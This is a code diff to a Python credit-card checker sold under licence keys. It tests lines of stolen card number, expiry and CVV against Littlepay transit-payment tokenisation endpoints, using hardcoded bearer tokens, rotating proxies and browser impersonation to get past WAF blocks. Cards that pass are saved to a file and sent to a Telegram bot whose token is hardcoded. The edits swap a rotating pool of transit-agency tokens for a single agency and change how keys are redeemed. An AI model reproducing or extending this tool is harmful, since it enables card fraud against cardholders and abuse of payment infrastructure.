@@ -35,65 +35,12 @@ DEFAULT_TG_TOKEN = "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg"
 DEFAULT_TG_CHAT = "6516330870"
 IDLE_PAUSE_THRESHOLD = 20
 
-TOKENISATION_BASE = "https://web.uk.littlepay.com"
-PARTICIPANT_ID = "snapper-gwrc"
-FALLBACK_BEARER_TOKEN = (
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
-    "eyJwYXJ0aWNpcGFudF9pZCI6InNuYXBwZXItZ3dyYyIsImFkZHJlc3NSZXF1aXJlZEZvclZlcmlmaWNhdGlvbiI6ZmFsc2UsImNhcmRob2xkZXJBdXRoVHlwZSI6IkNWViIsImV4cCI6MTc5NTQyOTAwMSwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0."
-    "J7HbSUqR4M2wirVgBG0ATltx2oRbSHuNNgnju_sf_SM"
-)
-
-PARTICIPANT_POOL = [
-    (
-        "snapper-gwrc",
-        "https://snapper.littlepay.com/en/snapper-gwrc/signin",
-        "https://snapper.littlepay.com",
-        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
-        "eyJwYXJ0aWNpcGFudF9pZCI6InNuYXBwZXItZ3dyYyIsImFkZHJlc3NSZXF1aXJlZEZvclZlcmlmaWNhdGlvbiI6ZmFsc2UsImNhcmRob2xkZXJBdXRoVHlwZSI6IkNWViIsImV4cCI6MTc5NTQyOTAwMSwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0."
-        "J7HbSUqR4M2wirVgBG0ATltx2oRbSHuNNgnju_sf_SM",
-    ),
-    (
-        "mtta",
-        "https://mtta.littlepay.com/en-US/mtta/signin",
-        "https://mtta.littlepay.com",
-        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
-        "eyJwYXJ0aWNpcGFudF9pZCI6Im10dGEiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJleHAiOjE3OTU0MjkyOTQsIm5hbWUiOiJDQVJEX1RPS0VOSVNBVElPTiJ9."
-        "EgVCkCmIMQRRdy58qeC5diz_P6jtnbmP_UsdFIz88zk",
-    ),
-    (
-        "first-group",
-        "https://first-group.littlepay.com/en/first-group/signin",
-        "https://first-group.littlepay.com",
-        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
-        "eyJwYXJ0aWNpcGFudF9pZCI6ImZpcnN0LWdyb3VwIiwiYWRkcmVzc1JlcXVpcmVkRm9yVmVyaWZpY2F0aW9uIjpmYWxzZSwiY2FyZGhvbGRlckF1dGhUeXBlIjoiQ1ZWIiwiZXhwIjoxNzk1NDI5NTgyLCJuYW1lIjoiQ0FSRF9UT0tFTklTQVRJT04ifQ."
-        "PBCiXApHWYPqrvFXWhVDUJ_H1d8SZpzVKvNOUTuAL8s",
-    ),
-    (
-        "mcta",
-        "https://trips.littlepay.com/en/mcta/signin",
-        "https://trips.littlepay.com",
-        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
-        "eyJwYXJ0aWNpcGFudF9pZCI6Im1jdGEiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJleHAiOjE3OTUzNjA0OTYsIm5hbWUiOiJDQVJEX1RPS0VOSVNBVElPTiJ9."
-        "Sl2dmPbcOTgSiVhOINnAhj_-HfoHOwhbaPs0nXdscy0",
-    ),
-]
-
 checker_queue = queue.Queue()
 checker_stop_event = threading.Event()
 checker_running = threading.Event()
 db_lock = threading.Lock()
-_p_idx = 0
-_p_lock = threading.Lock()
 _bin_cache_lock = threading.Lock()
 _bin_cache: dict[str, dict] = {}
-
-
-def _next_participant():
-    global _p_idx
-    with _p_lock:
-        prof = PARTICIPANT_POOL[_p_idx % len(PARTICIPANT_POOL)]
-        _p_idx += 1
-    return prof
 
 
 def load_config():
@@ -191,6 +138,7 @@ def sync_key_usage(key_info, now_ts, active_ping=False, force_pause=False):
     rem_sec = key_info.get("remaining_seconds")
     if rem_sec is None:
         if active_ping:
+            key_info["redeemed"] = True
             key_info["is_paused"] = False
             key_info["last_active_ts"] = now_ts
         elif force_pause:
@@ -229,13 +177,14 @@ def sync_key_usage(key_info, now_ts, active_ping=False, force_pause=False):
         key_info["is_paused"] = True
         key_info["last_active_ts"] = None
     elif active_ping:
+        key_info["redeemed"] = True
         key_info["is_paused"] = False
         key_info["last_active_ts"] = now_ts
 
     return key_info
 
 
-def save_live_card(card_line, detail, bin_info=None, proxy_info=None, site_name="LITTLEPAY"):
+def save_live_card(card_line, detail, bin_info=None, proxy_info=None):
     try:
         with open(LIVE_FILE, "a", encoding="utf-8") as f:
             f.write(f"{card_line} | {detail}\n")
@@ -259,7 +208,7 @@ def save_live_card(card_line, detail, bin_info=None, proxy_info=None, site_name=
             tg_msg = (
                 f"<b>CVV AUTH — LIVE HIT ✅</b>\n\n"
                 f"💳 <b>Card:</b> <code>{card_line}</code>\n"
-                f"🌐 <b>Gateway:</b> {site_name} (4x Rotating Littlepay)\n"
+                f"🌐 <b>Gateway:</b> Littlepay (Auth)\n"
                 f"💬 <b>Response:</b> {detail}\n"
                 f"🏷️ <b>Type:</b> {scheme} - {card_type}\n"
                 f"📅 <b>Date:</b> {date_str}\n"
@@ -457,7 +406,7 @@ def handle_keys():
                 }
                 created_keys.append(custom_key)
             else:
-                prefix = custom_key.upper() if custom_key else "LITTLEPAY"
+                prefix = custom_key if custom_key else "KYU"
                 for _ in range(quantity):
                     while True:
                         part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
@@ -486,7 +435,7 @@ def handle_keys():
                 tg_msg = (
                     f"<b>⚡ KYU CVV AUTH - LICENSE GENERATOR ⚡</b>\n\n"
                     f"📦 <b>Generated:</b> <code>{len(created_keys)} key(s)</code>\n"
-                    f"⏳ <b>Duration:</b> <code>{exp_label} (One-Time Redeem)</code>\n\n"
+                    f"⏳ <b>Duration:</b> <code>{exp_label} (Starts on Redeem)</code>\n\n"
                     f"{keys_formatted}"
                 )
                 send_telegram_alert(token, chat_id, tg_msg)
@@ -560,25 +509,6 @@ def verify_key():
                 "remaining_seconds": key_info.get("remaining_seconds")
             })
 
-        if action == 'redeem':
-            if key_info.get('redeemed', False):
-                return jsonify({"success": False, "message": "Key already redeemed."}), 403
-            key_info['device_id'] = device_id
-            key_info['redeemed'] = True
-            key_info['redeemed_at'] = now_ts
-            sync_key_usage(key_info, now_ts, active_ping=True, force_pause=False)
-            if key_info.get('status') != 'active':
-                save_db(keys_data)
-                return jsonify({"success": False, "message": "License key has expired."})
-            save_db(keys_data)
-            return jsonify({
-                "success": True,
-                "key": matched_key,
-                "remaining_seconds": key_info.get('remaining_seconds'),
-                "redeemed": True,
-                "is_paused": key_info.get('is_paused', False)
-            })
-
         stored_device = key_info.get('device_id', '')
         if stored_device and stored_device != device_id:
             return jsonify({"success": False, "message": "HWID mismatch (Bound to another device)."})
@@ -625,9 +555,6 @@ def api_validate():
         now_ts = int(datetime.now(timezone.utc).timestamp())
         sync_key_usage(info, now_ts, active_ping=False)
 
-        if info.get("redeemed", False):
-            return jsonify({"success": False, "message": "Key already redeemed."}), 403
-
         rem = info.get("remaining_seconds")
         if rem is not None and rem <= 0:
             save_db(keys_data)
@@ -637,14 +564,19 @@ def api_validate():
         if bound and bound != hwid:
             return jsonify({"success": False, "message": "HWID mismatch"}), 403
 
-        info["device_id"] = hwid
-        info["redeemed"] = True
-        info["redeemed_at"] = now_ts
-        info["is_paused"] = False
-        info["last_active_ts"] = now_ts
-        save_db(keys_data)
+        if not bound:
+            info["device_id"] = hwid
+            info["redeemed"] = True
+            info["is_paused"] = False
+            info["last_active_ts"] = now_ts
+            save_db(keys_data)
 
-        return jsonify({"success": True, "message": "OK", "key": matched_key, "redeemed": True})
+        return jsonify({"success": True, "message": "OK", "key": matched_key})
+
+
+TOKENISATION_BASE = "https://web.uk.littlepay.com"
+PARTICIPANT_ID = "coast-rta"
+FALLBACK_BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJwYXJ0aWNpcGFudF9pZCI6ImNvYXN0LXJ0YSIsImV4cCI6MTc5NDU3MjQwMiwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0.Fin7fy3YesZsGCNe-owY9x6-RGK2qGykGSIYhbJDE8k"
 
 
 def _format_proxy_url(p_str: str) -> str:
@@ -677,25 +609,20 @@ class WebProxyPool:
 
 
 class DynamicTokenManager:
-    def __init__(self, initial_token, proxy_pool, participant_id=PARTICIPANT_ID, origin_url="https://snapper.littlepay.com"):
+    def __init__(self, initial_token, proxy_pool):
         self.token = initial_token
         self.proxy_pool = proxy_pool
-        self.participant_id = participant_id
-        self.origin_url = origin_url
 
-    def get_token(self, session=None, proxy_str=None, participant_id=None, origin_url=None, seed_token=None):
-        pid = participant_id or self.participant_id
-        orig = origin_url or self.origin_url
-        base_tok = seed_token or self.token
+    def get_token(self, session=None, proxy_str=None):
         url = f"{TOKENISATION_BASE}/api/v1/customer/tokens/request-token"
         headers = {
-            "Authorization": f"Bearer {base_tok}",
+            "Authorization": f"Bearer {self.token}",
             "Content-Type": "application/json;charset=UTF-8",
             "Accept": "application/json, text/plain, */*",
-            "Origin": orig,
-            "Referer": f"{orig}/"
+            "Origin": "https://coastrta.littlepay.com",
+            "Referer": "https://coastrta.littlepay.com/"
         }
-        body = {"request_access": "CARD_TOKENISATION", "participant_id": pid, "external_participant_id": pid}
+        body = {"request_access": "CARD_TOKENISATION", "external_participant_id": PARTICIPANT_ID}
         if proxy_str is None and self.proxy_pool:
             p_dict = self.proxy_pool.next()
             proxy_str = p_dict["http"] if p_dict else None
@@ -704,14 +631,13 @@ class DynamicTokenManager:
             resp = req_session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=6, verify=False)
             if resp.status_code == 200:
                 data = resp.json()
-                new_token = data.get("access_token") or data.get("token")
+                new_token = data.get("access_token")
                 if new_token:
-                    if not participant_id and not seed_token:
-                        self.token = new_token
+                    self.token = new_token
                     return new_token
         except Exception:
             pass
-        return base_tok
+        return self.token
 
 
 def test_proxy(proxy_dict):
@@ -778,33 +704,26 @@ def create_native_jwe(plaintext: str, key_entry: dict) -> str:
 def check_single_card(card_line, proxy_pool, token_manager):
     parts = card_line.split("|")
     if len(parts) < 3:
-        return 2, "ERROR", "Invalid format (cc|mo|yr|cvv)", PARTICIPANT_ID
+        return 2, "ERROR", "Invalid format (cc|mo|yr|cvv)"
 
     cc, mo, yr = parts[0].strip(), parts[1].strip(), parts[2].strip()
     cvv = parts[3].strip() if len(parts) > 3 else ""
     expiry = f"{mo}/{yr[-2:]}"
     card_type = "visa" if cc.startswith("4") else "mastercard"
 
-    pid, _, origin_url, seed_tok = _next_participant()
     session = cffi_requests.Session(impersonate="chrome")
     p_dict = proxy_pool.next() if proxy_pool else None
     proxy_str = p_dict["http"] if p_dict else None
 
     try:
-        current_token = token_manager.get_token(
-            session=session,
-            proxy_str=proxy_str,
-            participant_id=pid,
-            origin_url=origin_url,
-            seed_token=seed_tok,
-        )
+        current_token = token_manager.get_token(session=session, proxy_str=proxy_str)
 
         headers = {
             "Authorization": f"Bearer {current_token}",
             "Accept": "application/json, text/plain, */*",
             "Accept-Language": "en-US,en;q=0.9",
-            "Origin": origin_url,
-            "Referer": f"{origin_url}/",
+            "Origin": "https://coastrta.littlepay.com",
+            "Referer": "https://coastrta.littlepay.com/",
             "Sec-Fetch-Dest": "empty",
             "Sec-Fetch-Mode": "cors",
             "Sec-Fetch-Site": "cross-site",
@@ -818,11 +737,11 @@ def check_single_card(card_line, proxy_pool, token_manager):
             verify=False
         )
         if r.status_code != 200:
-            return 2, "ERROR", f"HTTP {r.status_code} (WAF Block)", pid
+            return 2, "ERROR", f"HTTP {r.status_code} (WAF Block)"
 
         keys = r.json().get("list", [])
         if not keys:
-            return 2, "ERROR", "No public keys", pid
+            return 2, "ERROR", "No public keys"
         key_entry = random.choice(keys)
 
         payload = {"ch_name": "", "cc_num": cc, "card_type": card_type, "card_date": expiry, "ch_country": "US"}
@@ -854,12 +773,12 @@ def check_single_card(card_line, proxy_pool, token_manager):
             res_data = {"status": "ERROR"}
 
         status = str(res_data.get("status") or res_data.get("state") or "").upper()
-        if status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED", "AUTHENTICATION_FAILED"):
-            return 1, "DEAD", f"CARD_DECLINED ({status})", pid
+        if status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED"):
+            return 1, "DEAD", f"CARD_DECLINED ({status})"
 
         auth_id = res_data.get("authentication_id")
         if not auth_id:
-            return 1, "DEAD", "CARD_DECLINED", pid
+            return 1, "DEAD", "CARD_DECLINED"
 
         r3 = session.get(
             f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
@@ -876,16 +795,16 @@ def check_single_card(card_line, proxy_pool, token_manager):
 
         tok_status = str(tok_data.get("status") or tok_data.get("state") or "").upper()
         if tok_status in ("FAILED", "DECLINED", "REJECTED", "ERROR"):
-            return 1, "DEAD", f"CARD_DECLINED ({tok_status})", pid
+            return 1, "DEAD", f"CARD_DECLINED ({tok_status})"
 
         if tok_data.get("authenticated_payment_token"):
-            return 0, "LIVE", "APPROVED", pid
+            return 0, "LIVE", "APPROVED"
 
-        return 1, "DEAD", "DECLINED", pid
+        return 1, "DEAD", "DECLINED"
 
     except Exception as e:
         err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
-        return 2, "ERROR", err_msg[:50] or "Timeout", pid
+        return 2, "ERROR", err_msg[:50] or "Timeout"
     finally:
         try:
             session.close()
@@ -925,7 +844,7 @@ def background_worker(cards, proxies_list, max_threads):
         if checker_stop_event.is_set():
             return
 
-        code, status, detail, site_name = check_single_card(card, proxy_pool, token_manager)
+        code, status, detail = check_single_card(card, proxy_pool, token_manager)
         bin_code = card.split("|")[0].strip()[:6]
         bin_meta = fetch_best_bin(bin_code)
 
@@ -939,7 +858,7 @@ def background_worker(cards, proxies_list, max_threads):
             counts["checked"] += 1
             if code == 0:
                 counts["live"] += 1
-                save_live_card(card, detail, bin_meta, current_proxy_used, site_name=site_name)
+                save_live_card(card, detail, bin_meta, current_proxy_used)
             elif code == 1:
                 counts["dead"] += 1
             else:
@@ -950,7 +869,6 @@ def background_worker(cards, proxies_list, max_threads):
                 "status": status,
                 "code": code,
                 "detail": detail,
-                "site": site_name,
                 "bin_info": bin_meta,
                 **counts
             })
